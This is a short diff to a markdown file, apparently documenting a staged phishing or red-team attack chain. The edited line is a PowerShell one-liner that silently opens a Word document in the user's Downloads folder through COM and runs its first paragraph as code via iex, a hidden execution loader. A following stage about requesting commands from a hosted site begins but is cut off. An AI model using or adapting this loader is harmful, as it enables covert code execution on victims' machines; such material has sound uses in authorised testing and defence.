@@ -22,7 +22,7 @@ If you edit RealJuicyWebLinks, the suspicious link may need to be updated as wel
 # Stages
 Call the other word document
 ```Powershell
-c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "&{$word = new-object -comobject word.application; $word.visible = $false; $doc = $word.Documents.Open(\"$env:userprofile\downloads\Document1.docx\"); $doc.Paragraphs[1].range.text | iex}"
+c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "&{$word = new-object -comobject word.application; $word.visible = $false; $doc = $word.Documents.Open(\"$env:userprofile\downloads\wordfornotes.docx\"); $doc.Paragraphs[1].range.text | iex}"
 ```
 Request the commands hosted on a particular site
 ```Powershell
